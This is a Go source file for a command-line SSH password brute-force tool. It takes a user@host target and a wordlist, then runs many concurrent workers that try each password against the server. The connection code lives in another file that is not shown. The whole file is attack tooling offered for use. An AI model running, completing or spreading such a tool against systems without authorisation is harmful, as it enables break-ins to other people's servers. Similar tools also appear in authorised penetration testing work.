// TODO
// If ssh password auth is not supported, detect it and stop the program
// handle RST packet (retry quit ignore etc)

// Package main implements a simple ssh bruteforce tool to use with wordlists.
package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/UlisseMini/clean"
)

var (
	user string
	addr string

	wordlist = flag.String("w", "wordlist.txt", "indicate wordlist file to use")
	timeout  = flag.Duration("t", 400*time.Millisecond,
		"Set the timeout depending on the latency between you and the remote host.")

	debug   = flag.Bool("d", false, "debug mode, print logs to stderr")
	workers = flag.Int("g", 16,
		"how meny goroutines should be making concurrent connections")
)

// parseArgs parses cmdline arguments
func parseArgs() {
	args := flag.Args()
	if len(args) != 1 {
		flag.Usage()
		clean.Exit(1)
	}

	atIndex := strings.LastIndexByte(args[0], '@')
	user = args[0][:atIndex]
	addr = args[0][atIndex+1:]

	if !strings.ContainsRune(args[0], ':') {
		addr += ":22"
		return
	}
}

func main() {
	defer clean.Do()

	flag.Parse()
	parseArgs()
	// Print options used.
	fmt.Printf("target: %s@%s\n", user, addr)
	fmt.Printf("timeout: %v\n", timeout)
	fmt.Printf("wordlist: %s\n", *wordlist)

	if *debug {
		log.SetOutput(os.Stderr)
	}

	passFile, err := os.Open(*wordlist)
	if err != nil {
		fmt.Printf("Error opening wordlist: %v\n", err)
		return
	}

	// add closing the file to global cleanup
	clean.Add(func() {
		passFile.Close()
	}, "passFile")

	scanner := bufio.NewScanner(passFile)

	// create factory
	fac := &sshFactory{
		user:    user,
		timeout: *timeout,
		addr:    addr,
	}

	// Get finished tasks from the finished channel
	finished := make(chan task)
	go func() {
		log.Println("starting to recv from finished")
		for t := range finished {
			// t.output will terminate the progam if it gets the right password
			t.output()
		}
		log.Println("done recv from finished")
	}()

	lines := make(chan string)
	var wg sync.WaitGroup
	// create goroutine workers
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for line := range lines {
				t := fac.make(line)

				t.do()
				finished <- t
			}
		}()
	}

	for scanner.Scan() {
		line := scanner.Text()
		lines <- line
	}
	close(lines)

	// wait for the tasks to be done
	log.Println("waiting for WaitGroup")
	wg.Wait()

	log.Println("closing finished")
	close(finished) // all tasks are finished so close finished.
}
